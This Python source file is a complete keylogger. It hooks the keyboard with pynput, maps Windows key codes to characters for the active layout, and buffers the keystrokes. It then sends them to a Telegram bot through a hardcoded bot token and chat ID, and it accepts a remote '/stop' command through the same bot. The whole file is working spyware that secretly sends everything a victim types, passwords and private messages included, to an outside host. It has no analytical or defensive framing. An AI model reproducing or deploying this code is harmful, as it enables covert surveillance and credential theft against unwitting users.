
import ctypes
import sys
import threading
import time
from ctypes import wintypes
from datetime import datetime, timedelta
from queue import Empty, Queue
from typing import List, Optional

import requests
from pynput import keyboard

BOT_TOKEN = "7756196800:AAE_2EBn1gp9ZZTUatjsVdPt68DLV3usEOU"
CHAT_ID = "7075072566"

def send_key(key: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": key}
    try:
        requests.post(url, data=params)
    except Exception:
        pass

_user32 = None
if sys.platform == "win32":
    _user32 = ctypes.WinDLL("user32", use_last_error=True)
    _user32.GetForegroundWindow.restype = wintypes.HWND
    _user32.GetForegroundWindow.argtypes = []
    _user32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
    _user32.GetKeyboardLayout.restype = wintypes.HKL
    _user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
    _user32.MapVirtualKeyW.restype = wintypes.UINT
    _user32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    _user32.GetKeyboardState.restype = wintypes.BOOL
    _user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8)]
    _user32.GetKeyState.restype = ctypes.c_short
    _user32.GetKeyState.argtypes = [wintypes.INT]
    _user32.ToUnicodeEx.restype = ctypes.c_int
    _user32.ToUnicodeEx.argtypes = [
        wintypes.UINT,
        wintypes.UINT,
        ctypes.POINTER(ctypes.c_uint8),
        ctypes.c_void_p,
        ctypes.c_int,
        wintypes.UINT,
        wintypes.HKL,
    ]


def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
    if _user32 is None:
        return None

    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    scan_code = _user32.MapVirtualKeyW(vk, 0)
    if scan_code == 0:
        return None

    keyboard_state = (ctypes.c_uint8 * 256)()
    if not _user32.GetKeyboardState(keyboard_state):
        for virtual_key in range(256):
            keyboard_state[virtual_key] = _user32.GetKeyState(virtual_key) & 0xFF

    buffer = ctypes.create_unicode_buffer(8)
    layout = _get_active_keyboard_layout()

    keyboard_state[vk] = keyboard_state[vk] | 0x80
    result = _user32.ToUnicodeEx(
        vk,
        scan_code,
        keyboard_state,
        buffer,
        len(buffer),
        0,
        layout,
    )

    if result == -1:
        _user32.ToUnicodeEx(
            vk,
            scan_code,
            keyboard_state,
            buffer,
            len(buffer),
            0,
            layout,
        )
        return None

    if result > 0:
        return buffer.value[:result]

    return None


def _get_active_keyboard_layout() -> wintypes.HKL:
    if _user32 is None:
        return wintypes.HKL(0)

    foreground_window = _user32.GetForegroundWindow()
    if foreground_window:
        process_id = wintypes.DWORD()
        thread_id = _user32.GetWindowThreadProcessId(
            foreground_window, ctypes.byref(process_id)
        )
        if thread_id:
            layout = _user32.GetKeyboardLayout(thread_id)
            if layout:
                return layout
    return _user32.GetKeyboardLayout(0)


def key_to_str(key):
    if key in {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.alt,
        keyboard.Key.alt_gr,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
    }:
        return None
    if key == keyboard.Key.caps_lock:
        return "{caps_lock}"
    if key == keyboard.Key.enter:
        return "{return}"
    if key == keyboard.Key.backspace:
        return "{backspace}"
    if key == keyboard.Key.tab:
        return "{tab}"
    if key == keyboard.Key.space:
        return " "
    if key == keyboard.Key.esc:
        return "{escape}"
    if isinstance(key, keyboard.KeyCode):
        translated = _translate_keycode_windows(key)
        if translated:
            return translated
        if key.char:
            return key.char
        fallback = _fallback_printable_from_vk(key)
        if fallback:
            return fallback
    return None


_VK_NUMPAD_DIGITS = {0x60 + digit: str(digit) for digit in range(10)}


def _fallback_printable_from_vk(key_code: keyboard.KeyCode) -> Optional[str]:
    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    if 0x30 <= vk <= 0x39:
        return chr(vk)
    if 0x41 <= vk <= 0x5A:
        return chr(vk).lower()

    numpad = _VK_NUMPAD_DIGITS.get(vk)
    if numpad:
        return numpad

    numpad_ops = {
        0x6A: "*",
        0x6B: "+",
        0x6D: "-",
        0x6E: ".",
        0x6F: "/",
    }
    if vk in numpad_ops:
        return numpad_ops[vk]

    oem_mapping = {
        0xBA: ";",
        0xBB: "=",
        0xBC: ",",
        0xBD: "-",
        0xBE: ".",
        0xBF: "/",
        0xC0: "`",
        0xDB: "[",
        0xDC: "\\",
        0xDD: "]",
        0xDE: "'",
        0xDF: "#",
    }
    if vk in oem_mapping:
        return oem_mapping[vk]

    return None

def worker(q: Queue, stop_event: threading.Event):
    count = 0
    window_start = datetime.now()
    buffer: List[str] = []
    last_input_monotonic: Optional[float] = None

    def send_buffer():
        nonlocal count, window_start, buffer, last_input_monotonic
        if not buffer:
            return
        now = datetime.now()
        if now - window_start >= timedelta(seconds=1):
            window_start = now
            count = 0
        if count >= 30:
            sleep_time = (window_start + timedelta(seconds=1) - now).total_seconds()
            if sleep_time > 0:
                time.sleep(sleep_time)
            window_start = datetime.now()
            count = 0
        send_key("".join(buffer))
        count += 1
        buffer.clear()
        last_input_monotonic = None

    while not stop_event.is_set():
        try:
            key = q.get(timeout=0.5)
        except Empty:
            if (
                buffer
                and last_input_monotonic is not None
                and time.monotonic() - last_input_monotonic >= 10
            ):
                send_buffer()
            continue

        if key is None:
            break

        if stop_event.is_set():
            continue

        now_monotonic = time.monotonic()

        if key == "{backspace}":
            if buffer:
                buffer.pop()
                last_input_monotonic = now_monotonic
            continue

        buffer.append(key)
        last_input_monotonic = now_monotonic

        if key == "{return}":
            send_buffer()

    if buffer:
        send_buffer()

def on_press_factory(q: Queue, stop_event: threading.Event):
    def on_press(key):
        if stop_event.is_set():
            return False
        key_str = key_to_str(key)
        if key_str is not None:
            q.put(key_str)
        return True

    return on_press


def poll_stop_command(stop_event: threading.Event, q: Queue):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    offset: Optional[int] = None
    while not stop_event.is_set():
        params = {"timeout": 30}
        if offset is not None:
            params["offset"] = offset
        try:
            response = requests.get(url, params=params, timeout=35)
            data = response.json()
        except Exception:
            time.sleep(5)
            continue

        if not data.get("ok"):
            time.sleep(5)
            continue

        for update in data.get("result", []):
            offset = update.get("update_id", 0) + 1
            message = update.get("message") or update.get("channel_post")
            if not message:
                continue
            chat = message.get("chat") or {}
            text = message.get("text")
            if text and text.strip() == "/stop" and str(chat.get("id")) == CHAT_ID:
                stop_event.set()
                q.put(None)
                return

stop_event = threading.Event()
q = Queue()
worker_thread = threading.Thread(target=worker, args=(q, stop_event), daemon=True)
worker_thread.start()

threading.Thread(target=poll_stop_command, args=(stop_event, q), daemon=True).start()

listener = keyboard.Listener(on_press=on_press_factory(q, stop_event))
listener.start()

try:
    while not stop_event.wait(0.1):
        pass
finally:
    listener.stop()
    listener.join()
    q.put(None)
    worker_thread.join()
